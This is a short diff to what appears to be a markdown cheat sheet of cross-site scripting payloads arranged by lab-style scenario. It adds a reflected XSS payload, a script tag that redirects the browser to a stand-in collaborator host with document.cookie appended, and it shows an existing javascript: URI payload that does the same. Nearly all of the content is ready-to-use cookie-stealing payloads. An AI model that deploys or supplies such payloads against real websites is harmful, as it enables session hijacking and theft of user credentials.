@@ -6,6 +6,13 @@
 ```Javascript
 JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
 ```  
+
+>Reflected XSS into HTML context with nothing encoded in search.  
+
+```JavaScript
+<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>
+```  
+
 >Reflected DOM XSS, into JSON data that is processed by **eval().**  
 
 ```JavaScript
